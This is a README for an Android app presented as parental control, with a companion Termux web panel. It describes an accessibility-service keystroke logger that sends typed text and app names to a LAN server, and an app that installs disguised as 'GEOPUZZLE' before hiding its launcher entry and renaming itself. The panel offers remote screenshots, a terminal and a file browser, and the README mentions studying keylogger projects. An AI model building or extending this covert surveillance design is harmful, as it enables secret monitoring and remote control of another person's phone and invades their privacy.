# Setup

A permission-light Android parental-control / device-setup app, plus the Termux web
control panel it reports to.

- **Package:** `com.example.setup`
- **Version:** 1.4 (`versionCode` 5)
- **Min SDK:** 24 · **Target/compile SDK:** 35
- **Release APK:** [`Setup.apk`](Setup.apk) (also mirrored as `GEOPUZZLE.apk`)

## Features

### Kid alerts
Install / uninstall / update, battery low + recovered, charger connected + removed,
screen-time limit reached, and a kid-triggered SOS button. Everything uses exempt
broadcasts — no polling and no extra permissions.

### Typing context (accessibility)
- Package name **and** resolved app label on every event.
- `isPassword()` (event + source node) ⇒ password fields are suppressed.
- 350 ms trailing debounce, so the final text is never lost.
- Batch up to 8 events / 1.2 s, one POST to `/kid-alert-batch`; the queue is only
  cleared after a 2xx response, otherwise events go back to disk and replay later.
- Bounded offline spool: 200 events / 48 KB (`EventSpool`).

### Device identity
`Build.MANUFACTURER + " " + Build.MODEL` is sent on `/connect`, every typing batch,
and every alert, so multiple phones never mix in the panel.

### Stealth / naming
First install shows launcher entry **GEOPUZZLE**; after first launch the alias is
disabled and the app is labelled **Setup.apk**, still reachable from the ongoing
notification, the `dw://open` deep link, or the panel.

### Permissions (5, all install-time)
`INTERNET`, `FOREGROUND_SERVICE`, `FOREGROUND_SERVICE_SPECIAL_USE`,
`RECEIVE_BOOT_COMPLETED`, `REQUEST_INSTALL_PACKAGES`.

## Control panel

The panel is a separate Node process (not bundled in the APK):

```bash
node panel/termux-control-server.js     # listens on 0.0.0.0:8080
```

Open `http://<phone-lan-ip>:8080/panel`. It provides:

- live typing feed and saved documents (`/kid-typing`, `/kid-docs`)
- alert feed with clear (`/alerts`, `/alerts/clear`)
- usage and daily limits (`/usage`, `/limits`)
- device controls: flashlight, brightness, vibrate, screenshot, battery
- terminal, file browser, and LLM-stack start/stop helpers

The APK currently points at `http://192.168.1.42:8080`
(`SafetyService.BASE`, `KeepAliveService.CONTROL_BASE`). Rebuild if the panel host
changes.

## Build

```bash
./gradlew assembleRelease
# app/build/outputs/apk/release/app-release.apk
```

## Tests

```bash
./gradlew testReleaseUnitTest          # 22 JVM tests
node tools/typing-batch-test.js        # live panel contract
node tools/alert-test.js
node tools/typing-context-test.js
```

See [`REFERENCE-APPS.md`](REFERENCE-APPS.md) for what was studied in Family Link,
AirDroid, Pinardin and the keylogger projects, and what was adopted or rejected.
